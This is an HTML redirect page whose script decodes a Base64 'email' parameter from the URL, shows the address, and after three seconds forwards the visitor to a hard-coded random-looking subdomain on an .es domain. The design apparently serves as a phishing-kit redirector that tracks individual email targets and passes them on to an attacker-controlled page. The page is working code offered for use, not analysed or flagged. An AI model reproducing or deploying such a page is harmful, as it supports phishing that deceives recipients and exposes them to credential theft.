<body>
  <div class="container">
    <h2>Redirecting...</h2>
    <div class="email-display" id="emailDisplay"></div>
    <div class="redirecting">Please wait while we send you to your destination.</div>
    <button class="button" id="redirectBtn" style="display:none;">Click here if not redirected</button>
  </div>

  <script>
    // Function to get query parameters
    function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // Function to decode Base64
    function decodeBase64(str) {
      try {
        return decodeURIComponent(escape(atob(str)));
      } catch (e) {
        return '';
      }
    }

    // Retrieve and decode the email parameter
    const encodedEmail = getQueryParam('email');
    const email = decodeBase64(encodedEmail || '');

    // Display the email if available
    if (email) {
      document.getElementById('emailDisplay').textContent = `Email: ${email}`;
    }

    // Define the destination URL
    const destinationUrl = 'https://AOxIb.vmxjiidteq.es/npxLoiuP1V@6WR3fb/'; // Replace with your desired URL

    // Redirect after a short delay
    if (destinationUrl) {
      setTimeout(() => {
        window.location.href = destinationUrl;
      }, 3000); // 3-second delay

      // Show a manual redirect button in case automatic redirect fails
      const redirectBtn = document.getElementById('redirectBtn');
      redirectBtn.style.display = 'inline-block';
      redirectBtn.addEventListener('click', () => {
        window.location.href = destinationUrl;
      });
    } else {
      document.querySelector('.redirecting').textContent = "Invalid or missing destination URL.";
    }
  </script>
</body>
</html>
